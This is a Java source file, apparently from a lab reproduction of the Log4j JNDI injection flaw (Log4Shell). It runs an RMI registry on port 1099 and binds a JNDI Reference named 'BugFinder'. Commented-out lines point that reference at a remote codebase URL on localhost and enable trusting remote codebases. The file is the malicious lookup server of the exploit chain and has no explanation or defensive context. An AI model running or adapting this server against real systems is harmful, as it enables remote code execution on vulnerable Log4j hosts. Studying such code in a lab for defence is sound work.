package com.fhdone.paper2019.util.log4jhack;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {

    public static void main(String[] args) {
        try {
            //System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
//            Reference reference = new Reference("com.fhdone.paper2019.util.log4jhack.BugFinder",
//                "com.fhdone.paper2019.util.log4jhack.BugFinder", "http://localhost:8013/BugFinder");
            Reference reference = new Reference("com.fhdone.paper2019.util.log4jhack.BugFinder",
                "com.fhdone.paper2019.util.log4jhack.BugFinder", null);

            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("BugFinder", referenceWrapper);
            Thread.currentThread().join();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
